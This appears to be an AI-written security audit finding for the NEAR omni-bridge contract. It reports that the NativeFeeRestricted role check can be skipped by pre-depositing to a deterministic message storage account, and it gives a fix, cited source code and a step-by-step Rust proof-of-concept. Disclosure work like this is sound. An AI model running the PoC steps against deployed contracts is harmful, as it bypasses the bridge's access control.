The vulnerability is real. Let me confirm the exact mechanics before writing the finding.

The `init_transfer` condition at lines 566–580 is a short-circuit OR:

```
Branch 1: try_to_transfer_balance_from_message_account(...).is_ok()
    OR
Branch 2: has_storage_balance(...) && (native_fee == 0 || !NativeFeeRestricted)
```

The `NativeFeeRestricted` check exists **only in Branch 2**. If Branch 1 returns `Ok`, the role check is never evaluated.

`try_to_transfer_balance_from_message_account` succeeds when:
1. `message_storage_account_id` is registered in `accounts_balances` with `total >= native_fee`
2. `signer_id` is registered in `accounts_balances`
3. Combined balance covers `required_storage_balance + native_fee`

`message_storage_account_id` is a SHA-256 hash of `TransferMessageStorageAccount { token, amount, recipient, fee, sender, msg }` + optional `external_id` — **nonces are excluded**, making it fully predictable before the transfer.

`storage_deposit` accepts any `account_id` with no restrictions — anyone can pre-register any account.

### Title
`NativeFeeRestricted` Role Bypass via Pre-Deposit to Deterministic Message Storage Account — (`near/omni-bridge/src/lib.rs`)

---

### Summary

The `NativeFeeRestricted` role check in `init_transfer` is placed only in the second branch of a short-circuit OR condition. An attacker holding the `NativeFeeRestricted` role can force the first branch to succeed by pre-depositing NEAR to the deterministically computable message storage account, causing the role check to be skipped entirely and allowing a transfer with a non-zero `native_token_fee` to proceed.

---

### Finding Description

In `init_transfer`, the storage-payer selection logic is:

```rust
if self
    .try_to_transfer_balance_from_message_account(   // Branch 1 — no role check
        &message_storage_account_id,
        NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
        &signer_id,
        required_storage_balance,
    )
    .is_ok()
    || (self.has_storage_balance(...)                 // Branch 2 — role check here
        && (init_transfer_msg.native_token_fee.0 == 0
            || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
``` [1](#0-0) 

The `NativeFeeRestricted` guard lives exclusively in Branch 2. If Branch 1 returns `Ok(())`, the entire right-hand side of the `||` is never evaluated.

`try_to_transfer_balance_from_message_account` returns `Ok` when:
1. `message_storage_account_id` is registered in `accounts_balances` with `total >= native_fee`
2. `signer_id` is registered in `accounts_balances`
3. Combined available balance covers `required_storage_balance + native_fee` [2](#0-1) 

There is no role check anywhere inside `try_to_transfer_balance_from_message_account`.

The `message_storage_account_id` is a SHA-256 hash of `TransferMessageStorageAccount { token, amount, recipient, fee, sender, msg }` plus an optional `external_id`. **Nonces (`origin_nonce`, `destination_nonce`) are excluded from the hash**, making the account ID fully predictable before the transfer is submitted. [3](#0-2) 

`storage_deposit` accepts any `account_id` with no caller restrictions — anyone can register and fund any account ID in `accounts_balances`. [4](#0-3) 

---

### Impact Explanation

An account granted `NativeFeeRestricted` can initiate transfers with an arbitrary non-zero `native_token_fee`, completely bypassing the intended access control restriction. This is a role bypass under the Critical impact category: "Unauthorized transaction, authorization bypass, role bypass… that lets an attacker execute bridge… actions."

---

### Likelihood Explanation

The exploit requires only two public contract calls (`storage_deposit` then `ft_transfer_call`) and offline computation of a SHA-256 hash. No privileged access beyond holding the `NativeFeeRestricted` role itself is needed. The message account ID is deterministic and computable by any party with knowledge of the planned transfer parameters. Likelihood is high for any account that has been assigned the restricted role and is motivated to circumvent it.

---

### Recommendation

Move the `NativeFeeRestricted` check to a position that is evaluated unconditionally whenever `native_token_fee > 0`, regardless of which storage-payment branch is taken. The simplest fix is to add an early guard at the top of `init_transfer`:

```rust
require!(
    init_transfer_msg.native_token_fee.0 == 0
        || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone()),
    BridgeError::NativeFeeRestricted.as_ref()
);
```

This ensures the restriction is enforced before any storage-payer branch is evaluated.

The same gap exists in `init_transfer_resume` (lines 635–645), which also calls `try_to_transfer_balance_from_message_account` without a role check. Although the yield path is only reached when Branch 1 fails in the initial call, a `NativeFeeRestricted` account that deposits to the message account after yielding would also bypass the check there. [5](#0-4) 

---

### Proof of Concept

```rust
// 1. Admin grants NativeFeeRestricted to attacker
contract.acl_grant_role("NativeFeeRestricted", attacker_id);

// 2. Attacker computes the message storage account ID offline
let storage_account = TransferMessageStorageAccount {
    token: OmniAddress::Near(token_id.clone()),
    amount: U128(transfer_amount),
    recipient: eth_recipient.clone(),
    fee: Fee { fee: U128(0), native_fee: U128(native_fee_amount) },
    sender: OmniAddress::Near(attacker_id.clone()),
    msg: String::new(),
};
let message_account_id = storage_account.id(None); // deterministic, no nonces

// 3. Attacker pre-deposits to the message storage account
//    (min_account_storage + native_fee_amount + required_transfer_storage)
attacker.call(bridge, "storage_deposit")
    .args_json(json!({ "account_id": message_account_id }))
    .deposit(pre_deposit_amount)
    .transact();

// 4. Attacker also registers themselves (needed by try_to_transfer_balance_from_message_account)
attacker.call(bridge, "storage_deposit")
    .args_json(json!({ "account_id": attacker_id }))
    .deposit(min_account_storage)
    .transact();

// 5. Attacker initiates transfer with non-zero native_token_fee
attacker.call(token, "ft_transfer_call")
    .args_json(json!({
        "receiver_id": bridge,
        "amount": U128(transfer_amount),
        "msg": json!({ "native_token_fee": U128(native_fee_amount), ... })
    }))
    .transact();

// Result: try_to_transfer_balance_from_message_account returns Ok,
// NativeFeeRestricted check at line 579-580 is never reached,
// transfer proceeds with native_token_fee > 0.
// Assert: InitTransferEvent emitted with fee.native_fee == native_fee_amount
```

### Citations

**File:** near/omni-bridge/src/lib.rs (L566-581)
```rust
        if self
            .try_to_transfer_balance_from_message_account(
                &message_storage_account_id,
                NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
                &signer_id,
                required_storage_balance,
            )
            .is_ok()
            || (self.has_storage_balance(
                &signer_id,
                required_storage_balance.saturating_add(NearToken::from_yoctonear(
                    init_transfer_msg.native_token_fee.0,
                )),
            ) && (init_transfer_msg.native_token_fee.0 == 0
                || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
        {
```

**File:** near/omni-bridge/src/lib.rs (L635-645)
```rust
        if let Err(err) = self.try_to_transfer_balance_from_message_account(
            &message_storage_account_id,
            NearToken::from_yoctonear(transfer_message.fee.native_fee.0),
            &storage_owner,
            self.required_balance_for_init_transfer_message(transfer_message.clone()),
        ) {
            env::log_str(&format!("Error paying native fee and storage: {err}"));
            return transfer_message.amount;
        }

        self.init_transfer_internal(transfer_message, storage_owner)
```

**File:** near/omni-bridge/src/storage.rs (L140-169)
```rust
    #[payable]
    pub fn storage_deposit(&mut self, account_id: Option<AccountId>) -> StorageBalance {
        let account_id = account_id.unwrap_or_else(env::predecessor_account_id);
        let amount = env::attached_deposit();
        let storage = self.accounts_balances.get(&account_id).map_or_else(
            || {
                let min_required_storage_balance = self.required_balance_for_account();
                let available = amount
                    .checked_sub(min_required_storage_balance)
                    .near_expect(StorageError::NotEnoughStorageBalanceAttached {
                        required: min_required_storage_balance,
                        attached: amount,
                    });
                StorageBalance {
                    total: amount,
                    available,
                }
            },
            |mut storage| {
                storage.total = storage.total.saturating_add(amount);
                storage.available = storage.available.saturating_add(amount);
                storage
            },
        );
        self.accounts_balances.insert(&account_id, &storage);

        self.resume_promise(&account_id).detach();

        storage
    }
```

**File:** near/omni-bridge/src/storage.rs (L260-290)
```rust
    pub(crate) fn try_to_transfer_balance_from_message_account(
        &mut self,
        account_id: &AccountId,
        native_fee: NearToken,
        storage_payer: &AccountId,
        required_storage_payer_balance: NearToken,
    ) -> Result<(), StorageError> {
        let balance = self
            .accounts_balances
            .get(account_id)
            .ok_or(StorageError::MessageAccountNotRegistered)?;

        if balance.total < native_fee {
            return Err(StorageError::NotEnoughBalanceForFee);
        }

        let mut storage = self
            .accounts_balances
            .get(storage_payer)
            .ok_or(StorageError::SignerNotRegistered)?;

        storage.available = storage.available.saturating_add(balance.total);

        if storage.available < required_storage_payer_balance.saturating_add(native_fee) {
            return Err(StorageError::SignerNotEnoughBalance);
        }

        self.accounts_balances.insert(storage_payer, &storage);
        self.accounts_balances.remove(account_id);
        Ok(())
    }
```

**File:** near/omni-types/src/lib.rs (L599-620)
```rust
#[near(serializers=[borsh])]
#[derive(Debug, Clone)]
pub struct TransferMessageStorageAccount {
    pub token: OmniAddress,
    pub amount: U128,
    pub recipient: OmniAddress,
    pub fee: Fee,
    pub sender: OmniAddress,
    pub msg: String,
}

impl TransferMessageStorageAccount {
    #[allow(clippy::missing_panics_doc)]
    pub fn id(&self, external_id: Option<String>) -> AccountId {
        let mut bytes = borsh::to_vec(self).unwrap();
        if let Some(external_id) = external_id {
            bytes.extend_from_slice(external_id.as_bytes());
        }
        let hash = utils::sha256(&bytes);
        let implicit_account_id = hex::encode(hash);
        AccountId::try_from(implicit_account_id).unwrap()
    }
```
